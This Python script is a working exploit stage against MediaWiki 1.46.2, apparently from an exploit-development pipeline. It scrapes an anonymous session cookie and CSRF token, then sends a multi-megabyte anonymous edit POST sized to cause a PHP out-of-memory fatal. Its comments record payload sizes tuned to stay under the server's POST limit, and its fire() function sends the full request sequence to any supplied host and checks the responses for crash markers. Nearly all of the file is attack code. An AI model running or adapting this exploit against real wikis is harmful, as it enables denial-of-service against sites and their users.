#!/usr/bin/env python3
"""producer_fpmwiki.py - fpmwiki producer stage: MediaWiki 1.46.2 anonymous-edit OOM (int N).

Promoted from the receipt run runs/run_fpmwiki_20261021_173406/producer_edit.py:
bootstrap anon mwdb_session cookie -> api.php csrftoken scrape -> multipart POST
/index.php?title=Sandbox&action=submit with wpTextbox1 = b"A"*N, wpEditToken,
wpSave (boundary ----PRODBOUND123, verbatim). N is an int; the receipt ladder
puts 5.7M-6.0M at the "Allowed memory size ... in Unknown on line 0" post-app
fatal and 9M past the post_max_size ceiling (pre-parser "POST Content-Length
exceeds the limit" warning instead, no app fatal - the productive window).

The module CLI and the driver (--step producer) send the byte-exact request
streams to the supplied target. fire() is guarded by a hard pre-send
POST_MAX_SIZE ceiling check. dry() remains the offline builder: shapes without
a scraped cookie/token are the byte-exact fallback templates (cookie-less
bootstrapless variant / token-scrape-fail variant) the send substitutes into.
"""

import argparse
import hashlib
import json
import re
import socket
import sys
from pathlib import Path

BOUNDARY = b"----PRODBOUND123"        # verbatim receipt boundary
DEFAULT_BODY_BYTES = 5_700_000        # 5.7M anonymous-edit OOM receipt
POST_MAX_SIZE = 8_388_608             # measured post_max_size budget (9M -> pre-parser warning)
MAX_BODY_BYTES = 16_777_216           # sanity roof (well above receipt ladder 1M..9M)
BOOTSTRAP_PATH = "/index.php?title=Main_Page"
TOKEN_PATH = "/api.php?action=query&meta=tokens&format=json"
EDIT_PATH = "/index.php?title=Sandbox&action=submit"
USER_AGENT = "producer-run/1.0"       # verbatim receipt header
MARKERS = (b"Allowed memory", b"content-too-big", b"errorbox", b"Fatal error")
MWDB_COOKIE = "mwdb_session"


def validate_body_bytes(text_bytes: int) -> None:
    if not isinstance(text_bytes, int) or isinstance(text_bytes, bool):
        raise TypeError("text_bytes must be an int")
    if not 1 <= text_bytes <= MAX_BODY_BYTES:
        raise ValueError(
            f"body bytes must be an int between 1 and {MAX_BODY_BYTES} "
            f"(receipt ladder 1M..9M; default {DEFAULT_BODY_BYTES})"
        )


def field(name: bytes, value: bytes) -> bytes:
    return (
        b"--" + BOUNDARY + b"\r\n"
        + b'Content-Disposition: form-data; name="' + name + b'"\r\n\r\n'
        + value + b"\r\n"
    )


def edit_body(text_bytes: int, token: bytes = b"") -> bytes:
    """Exact receipt multipart: field order wpTextbox1..wpEdittime/title."""
    validate_body_bytes(text_bytes)
    fields = [
        (b"wpTextbox1", b"A" * text_bytes),
        (b"wpEditToken", token),
        (b"wpSummary", b"producer"),
        (b"wpSave", b"Save page"),
        (b"wpStarttime", b"20261021000000"),  # verbatim receipt value
        (b"wpEdittime", b"20261021000000"),
        (b"title", b"Sandbox"),
    ]
    parts = [field(name, value) for name, value in fields]
    parts.append(b"--" + BOUNDARY + b"--\r\n")
    return b"".join(parts)


def request_bytes(
    method: str,
    path: str,
    host_header: str,
    body: bytes | None = None,
    ctype: str | None = None,
    cookie: str | None = None,
) -> bytes:
    headers = [
        f"{method} {path} HTTP/1.1",
        f"Host: {host_header}",
        f"User-Agent: {USER_AGENT}",
        "Connection: close",
    ]
    if cookie:
        headers.append(f"Cookie: {cookie}")
    if ctype:
        headers.append(f"Content-Type: {ctype}")
    if body is not None:
        headers.append(f"Content-Length: {len(body)}")
    return ("\r\n".join(headers) + "\r\n\r\n").encode("ascii") + (body or b"")


def build(host_header: str, text_bytes: int, cookie: str | None = None,
          token: bytes = b"") -> dict:
    """Byte-exact producer request streams. Pure/offline: nothing is sent."""
    body = edit_body(text_bytes, token)
    return {
        "bootstrap-request": request_bytes("GET", BOOTSTRAP_PATH, host_header),
        "token-request": request_bytes("GET", TOKEN_PATH, host_header, cookie=cookie),
        "edit-request": request_bytes(
            "POST", EDIT_PATH, host_header,
            body=body, ctype=f"multipart/form-data; boundary={BOUNDARY.decode()}",
            cookie=cookie,
        ),
        "edit_bytes": len(body),
        "over_budget": len(body) >= POST_MAX_SIZE,
    }


def scan_markers(data: bytes) -> list[dict]:
    hits = []
    for marker in MARKERS:
        at = data.find(marker)
        if at >= 0:
            hits.append({
                "marker": marker.decode("latin1"),
                "offset": at,
                "context": data[max(0, at - 80):at + 120].decode("latin1", "replace"),
            })
    return hits


def dry(host_header: str, text_bytes: int, output: Path) -> dict:
    """Offline stage: build + record the byte-exact request templates."""
    validate_body_bytes(text_bytes)
    artifacts = build(host_header, text_bytes)
    output.mkdir(parents=True, exist_ok=True)
    template_notes = {
        "bootstrap-request": "byte-exact; no substitutions on the live path",
        "token-request": "byte-exact cookie-less fallback template (live path "
                         "substitutes the scraped mwdb_session cookie)",
        "edit-request": "byte-exact token-scrape-fail fallback template (live path "
                        "substitutes the scraped wpEditToken)",
    }
    artifacts_meta = {}
    for name, data in artifacts.items():
        if not isinstance(data, bytes):
            continue
        (output / f"{name}.bin").write_bytes(data)
        artifacts_meta[name] = {
            "bytes": len(data),
            "sha256": hashlib.sha256(data).hexdigest(),
        }
    return {
        "stage": "producer",
        "dry_run": True,
        "sent": False,
        "body_bytes": text_bytes,
        "edit_body_bytes": artifacts["edit_bytes"],
        "over_budget": artifacts["over_budget"],
        "post_max_size": POST_MAX_SIZE,
        "boundary": BOUNDARY.decode("latin1"),
        "templates": template_notes,
        "artifacts": artifacts_meta,
    }


def fire(host: str, port: int, text_bytes: int, output: Path,
         timeout: float = 45.0) -> dict:
    """Send the ladder to the supplied target: bootstrap cookie -> token -> edit POST.

    Byte framing is identical to dry(): the dry-built edit request and the sent
    edit request differ only in the substituted cookie/token values.
    """
    validate_body_bytes(text_bytes)

    def exchange(request: bytes) -> tuple[bytes, bytes, dict[str, str], int]:
        from tool.modules import arm  # local import keeps the dry path import-free
        with socket.create_connection((host, port), timeout=timeout) as connection:
            connection.settimeout(timeout)
            connection.sendall(request)
            return arm.read_response(connection.makefile("rb", buffering=0))

    # pre-send ceiling estimate (token-scrape-fail template = length lower bound)
    if len(edit_body(text_bytes)) >= POST_MAX_SIZE:
        raise ValueError(
            f"edit body for N={text_bytes} reaches the measured post_max_size "
            f"ceiling {POST_MAX_SIZE} (9M receipt flips to the pre-parser "
            "'POST Content-Length exceeds the limit' warning, no app fatal)"
        )

    def record(name: str, request: bytes, response, body) -> dict:
        artifacts = {
            f"{name}-request.bin": request,
            f"{name}-response.bin": response,
            f"{name}-body.bin": body,
        }
        for fname, data in artifacts.items():
            (output / fname).write_bytes(data)
        return {
            name: {
                "bytes": len(data),
                "sha256": hashlib.sha256(data).hexdigest(),
            } for name, data in artifacts.items()
        }

    bootstrap_request = request_bytes("GET", BOOTSTRAP_PATH, f"{host}:{port}")
    _, bootstrap_body, headers, bootstrap_status = exchange(bootstrap_request)
    set_cookie = headers.get("set-cookie", "")
    match = re.search(rf"{MWDB_COOKIE}=([A-Za-z0-9]+)", set_cookie)
    cookie = f"{MWDB_COOKIE}={match.group(1)}" if match else None

    token_request = request_bytes("GET", TOKEN_PATH, f"{host}:{port}", cookie=cookie)
    _, token_body, _, token_status = exchange(token_request)
    try:
        token = json.loads(token_body)["query"]["tokens"]["csrftoken"].encode()
    except (ValueError, KeyError):
        token = b""  # byte-exact token-scrape-fail fallback shape

    edit_hostname = f"{host}:{port}"
    payload_body = edit_body(text_bytes, token)
    if len(payload_body) >= POST_MAX_SIZE:   # hard pre-send ceiling (receipt: 9M path)
        raise ValueError(
            f"edit body {len(payload_body)} bytes reaches the measured post_max_size "
            f"ceiling {POST_MAX_SIZE} (9M receipt flips to the pre-parser "
            "'POST Content-Length exceeds the limit' warning, no app fatal)"
        )
    edit_request = request_bytes(
        "POST", EDIT_PATH, edit_hostname, body=payload_body,
        ctype=f"multipart/form-data; boundary={BOUNDARY.decode()}", cookie=cookie,
    )
    _, edit_response, _, edit_status = exchange(edit_request)

    output.mkdir(parents=True, exist_ok=True)
    recorded = {}
    recorded.update(record("bootstrap", bootstrap_request, b"", bootstrap_body))
    recorded.update(record("token", token_request, b"", token_body))
    recorded.update(record("edit", edit_request, edit_response, edit_response))
    summary = {
        "stage": "producer",
        "dry_run": False,
        "sent": True,
        "host": host,
        "port": port,
        "body_bytes": text_bytes,
        "edit_body_bytes": len(payload_body),
        "over_budget": False,
        "post_max_size": POST_MAX_SIZE,
        "boundary": BOUNDARY.decode("latin1"),
        "cookie_scraped": bool(cookie),
        "token_scraped": bool(token),
        "status": {
            "bootstrap": bootstrap_status,
            "token": token_status,
            "edit": edit_status,
        },
        "markers": scan_markers(edit_response),
        "artifacts": recorded,
    }
    return summary


def main() -> int:
    parser = argparse.ArgumentParser(
        description="fpmwiki producer stage: send the receipt ladder to the "
        "supplied target")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=28840)
    parser.add_argument("--body-bytes", type=int, default=DEFAULT_BODY_BYTES,
                        help="wpTextbox1 'A'*N; int N, receipt sweet spot 5.7M-6.0M")
    parser.add_argument("--timeout", type=float, default=45.0)
    parser.add_argument("--output", required=True, type=Path)
    args = parser.parse_args()

    summary = fire(args.host, args.port, args.body_bytes, args.output,
                   timeout=args.timeout)
    (args.output / "result.json").write_text(
        json.dumps(summary, indent=2, sort_keys=True) + "\n")
    print(json.dumps({k: v for k, v in summary.items() if k != "artifacts"},
                     indent=2, sort_keys=True))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
